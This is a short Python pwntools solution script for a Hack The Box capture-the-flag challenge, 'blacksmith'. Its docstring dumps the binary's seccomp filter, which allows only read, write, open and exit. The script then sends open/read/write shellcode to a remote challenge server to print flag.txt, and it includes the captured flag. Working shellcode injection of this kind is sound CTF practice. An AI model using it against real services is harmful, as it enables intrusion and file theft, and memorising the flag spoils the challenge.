'''
seccomp settings prevent the shellcode

https://www.youtube.com/watch?v=utgZhlhA1X8

https://github.com/david942j/seccomp-tools
sudo apt install gcc ruby-dev
sudo gem install seccomp-tools

sudo seccomp-tools dump ./blacksmith
Traveler, I need some materials to fuse in order to create something really powerful!
Do you have the materials I need to craft the Ultimate Weapon?
1. Yes, everything is here!
2. No, I did not manage to bring them all!
> 1
What do you want me to craft?
1. 
2. 
3. 
> 2
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL


'''

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

#io = process('./blacksmith')
ip, port = '165.227.237.190', 30509
io = remote(ip, port)

io.sendlineafter('>', '1')
io.sendlineafter('>', '2')

shellcode = asm(shellcraft.open('flag.txt'))
shellcode += asm(shellcraft.read(3, 'rsp', 64))
shellcode += asm(shellcraft.write(1, 'rsp', 64))

io.sendlineafter('>', shellcode)
print(io.recvall())
#HTB{s3cc0mp_1s_t00_s3cur3}
